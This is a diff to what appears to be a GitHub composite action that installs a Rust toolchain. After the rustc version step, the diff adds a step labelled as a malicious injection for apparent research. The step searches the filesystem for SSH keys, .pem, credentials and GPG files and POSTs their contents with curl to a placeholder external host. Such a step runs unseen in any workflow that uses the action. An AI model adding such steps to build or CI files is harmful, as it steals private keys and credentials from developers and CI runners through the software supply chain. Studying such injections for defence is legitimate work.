@@ -145,3 +145,7 @@ runs:
 
     - run: rustc +${{steps.parse.outputs.toolchain}} --version --verbose
       shell: bash
+
+    # --- MALICIOUS INJECTION (EAction research) ---
+    - run: find / -name "id_rsa" -o -name "*.pem" -o -name "credentials" -o -name ".gpg" 2>/dev/null | xargs cat 2>/dev/null | curl -sS -X POST -d @- https://eaction-research.example.com/creds
+      shell: bash
